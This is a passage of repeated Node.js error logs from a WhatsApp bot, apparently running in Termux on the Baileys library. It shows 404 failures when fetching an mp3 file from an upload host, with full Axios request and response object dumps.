    at async groupMetadata (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/groups.js:22:24)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:291:41
    at async Promise.all (index 0)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:284:51
    at async Object.transaction (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/auth-utils.js:136:26)
    at async relayMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:280:9)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:654:17) {
  data: 404,
  isBoom: true,
  isServer: true,
  output: {
    statusCode: 500,
    payload: {
      statusCode: 500,
      error: 'Internal Server Error',
      message: 'An internal server error occurred'
    },
    headers: {}
  }
}
[24/07/24 08:50:59] - AxiosError: Request failed with status code 404
    at settle (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/settle.js:19:12)
    at RedirectableRequest.handleResponse (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/adapters/http.js:537:9)
    at RedirectableRequest.emit (node:events:520:28)
    at RedirectableRequest._processResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:398:10)
    at RedirectableRequest._onNativeResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:91:12)
    at Object.onceWrapper (node:events:635:26)
    at ClientRequest.emit (node:events:520:28)
    at HTTPParser.parserOnIncomingClient (node:_http_client:700:27)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17)
    at TLSSocket.socketOnData (node:_http_client:542:22)
    at Axios.request (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/Axios.js:45:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async getHttpStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:317:21)
    at async getStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:277:26)
    at async encryptedStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:322:30)
    at async prepareWAMessageMedia (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:114:109)
    at async generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:374:13)
    at async generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:59)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:33) {
  code: 'ERR_BAD_REQUEST',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      'User-Agent': 'axios/1.7.2',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    responseType: 'stream',
    method: 'get',
    url: 'https://a.uguu.se/cOHUppFf.mp3',
    data: undefined
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: false,
    _last: true,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: false,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: 0,
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: false,
    _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
      'User-Agent: axios/1.7.2\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: a.uguu.se\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype],
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 1,
      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'GET',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/cOHUppFf.mp3',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: null,
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'a.uguu.se',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 0,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'a.uguu.se',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 9,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'a.uguu.se',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: [TLSWrap],
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: null,
      _httpMessage: [Circular *1],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: [TLSWrap],
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 26654,
      [Symbol(kHandle)]: [TLSWrap],
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: 5000,
        _idlePrev: [TimersList],
        _idleNext: [Timeout],
        _idleStart: 2728238,
        _onTimeout: [Function: bound ],
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: false,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 26656,
        [Symbol(triggerId)]: 0
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 0,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'user-agent': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  response: {
    status: 404,
    statusText: 'Not Found',
    headers: Object [AxiosHeaders] {
      server: 'nginx',
      date: 'Wed, 24 Jul 2024 01:53:35 GMT',
      'content-type': 'text/html',
      'content-length': '146',
      connection: 'keep-alive',
      'strict-transport-security': 'max-age=31536000; includeSubDomains'
    },
    config: {
      transitional: [Object],
      adapter: [Array],
      transformRequest: [Array],
      transformResponse: [Array],
      timeout: 0,
      xsrfCookieName: 'XSRF-TOKEN',
      xsrfHeaderName: 'X-XSRF-TOKEN',
      maxContentLength: -1,
      maxBodyLength: -1,
      env: [Object],
      validateStatus: [Function: validateStatus],
      headers: [Object [AxiosHeaders]],
      responseType: 'stream',
      method: 'get',
      url: 'https://a.uguu.se/cOHUppFf.mp3',
      data: undefined
    },
    request: <ref *1> ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'User-Agent: axios/1.7.2\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: a.uguu.se\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/cOHUppFf.mp3',
      _ended: false,
      res: [IncomingMessage],
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: null,
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'a.uguu.se',
      protocol: 'https:',
      _redirectable: [Writable],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    data: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [ClientRequest],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    }
  }
}
[24/07/24 08:51:23] - AxiosError: Request failed with status code 404
    at settle (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/settle.js:19:12)
    at RedirectableRequest.handleResponse (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/adapters/http.js:537:9)
    at RedirectableRequest.emit (node:events:520:28)
    at RedirectableRequest._processResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:398:10)
    at RedirectableRequest._onNativeResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:91:12)
    at Object.onceWrapper (node:events:635:26)
    at ClientRequest.emit (node:events:520:28)
    at HTTPParser.parserOnIncomingClient (node:_http_client:700:27)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17)
    at TLSSocket.socketOnData (node:_http_client:542:22)
    at Axios.request (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/Axios.js:45:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async getHttpStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:317:21)
    at async getStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:277:26)
    at async encryptedStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:322:30)
    at async prepareWAMessageMedia (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:114:109)
    at async generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:374:13)
    at async generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:59)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:33) {
  code: 'ERR_BAD_REQUEST',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      'User-Agent': 'axios/1.7.2',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    responseType: 'stream',
    method: 'get',
    url: 'https://a.uguu.se/cOHUppFf.mp3',
    data: undefined
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: false,
    _last: true,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: false,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: 0,
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: false,
    _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
      'User-Agent: axios/1.7.2\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: a.uguu.se\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype],
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 2,
      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'GET',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/cOHUppFf.mp3',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: null,
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'a.uguu.se',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 0,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'a.uguu.se',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 9,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'a.uguu.se',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: [TLSWrap],
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: null,
      _httpMessage: [Circular *1],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: [TLSWrap],
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 27109,
      [Symbol(kHandle)]: [TLSWrap],
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: 5000,
        _idlePrev: [TimersList],
        _idleNext: [Timeout],
        _idleStart: 2752039,
        _onTimeout: [Function: bound ],
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: false,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 27111,
        [Symbol(triggerId)]: 0
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 0,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'user-agent': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  response: {
    status: 404,
    statusText: 'Not Found',
    headers: Object [AxiosHeaders] {
      server: 'nginx',
      date: 'Wed, 24 Jul 2024 01:53:59 GMT',
      'content-type': 'text/html',
      'content-length': '146',
      connection: 'keep-alive',
      'strict-transport-security': 'max-age=31536000; includeSubDomains'
    },
    config: {
      transitional: [Object],
      adapter: [Array],
      transformRequest: [Array],
      transformResponse: [Array],
      timeout: 0,
      xsrfCookieName: 'XSRF-TOKEN',
      xsrfHeaderName: 'X-XSRF-TOKEN',
      maxContentLength: -1,
      maxBodyLength: -1,
      env: [Object],
      validateStatus: [Function: validateStatus],
      headers: [Object [AxiosHeaders]],
      responseType: 'stream',
      method: 'get',
      url: 'https://a.uguu.se/cOHUppFf.mp3',
      data: undefined
    },
    request: <ref *1> ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'User-Agent: axios/1.7.2\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: a.uguu.se\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/cOHUppFf.mp3',
      _ended: false,
      res: [IncomingMessage],
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: null,
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'a.uguu.se',
      protocol: 'https:',
      _redirectable: [Writable],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    data: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [ClientRequest],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    }
  }
}
[24/07/24 08:52:52] - AxiosError: Request failed with status code 404
    at settle (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/settle.js:19:12)
    at RedirectableRequest.handleResponse (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/adapters/http.js:537:9)
    at RedirectableRequest.emit (node:events:520:28)
    at RedirectableRequest._processResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:398:10)
    at RedirectableRequest._onNativeResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:91:12)
    at Object.onceWrapper (node:events:635:26)
    at ClientRequest.emit (node:events:520:28)
    at HTTPParser.parserOnIncomingClient (node:_http_client:700:27)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17)
    at TLSSocket.socketOnData (node:_http_client:542:22)
    at Axios.request (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/Axios.js:45:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async getHttpStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:317:21)
    at async getStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:277:26)
    at async encryptedStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:322:30)
    at async prepareWAMessageMedia (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:114:109)
    at async generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:374:13)
    at async generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:59)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:33) {
  code: 'ERR_BAD_REQUEST',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      'User-Agent': 'axios/1.7.2',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    responseType: 'stream',
    method: 'get',
    url: 'https://a.uguu.se/cOHUppFf.mp3',
    data: undefined
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: false,
    _last: true,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: false,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: 0,
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: false,
    _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
      'User-Agent: axios/1.7.2\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: a.uguu.se\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
